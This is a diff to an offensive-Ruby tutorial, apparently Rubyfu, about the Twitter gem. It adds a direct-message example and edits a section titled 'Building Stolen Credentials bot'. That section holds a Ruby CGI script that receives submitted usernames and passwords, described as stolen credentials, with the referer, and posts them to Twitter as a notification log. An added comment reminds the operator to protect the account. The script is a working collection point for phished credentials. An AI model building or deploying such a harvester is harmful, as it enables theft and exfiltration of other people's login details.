@@ -22,10 +22,11 @@ client.follow("KINGSABRI")          # Follow User (as the authenticated user)
 client.followers("KINGSABRI")       # Fetch followers of a user
 client.followers                    # Fetch followers of current user 
 client.status(649235138585366528)   # Fetch a particular Tweet by ID
+client.direct_message_create("KINGSABRI", "Hi, I'm #Rubyfu")    # Send direct message to a particular user
 ```
 
 ## Building Stolen Credentials bot
-Here's the idea, We'll make a [CGI script][1]
+Here's the idea, We'll make a [CGI script][1] that takes sent stolen credentials then tweet these credentials to as notification or log function
 ```ruby
 #!/usr/bin/ruby -w                                                                 
 
@@ -34,7 +35,7 @@ require 'uri'
 require 'twitter'
 
 cgi  = CGI.new
-puts cgi.header  # content type 'text/html'
+puts cgi.header
 
 user = CGI.escape cgi['user']
 pass = CGI.escape cgi['pass']
@@ -49,7 +50,7 @@ end
 client.user("KINGSABRI")
 
 if cgi.referer.nil? or cgi.referer.empty?
-    # Twitter notification
+    # Twitter notification | WARNING! It's tweets, make sure your account is protected!!!
     client.update("[Info] No Refere!\n" + "#{CGI.unescape user}:#{CGI.unescape pass}")
 else
     client.update("[Info] #{cgi.referer}\n #{CGI.unescape user}:#{CGI.unescape pass}")
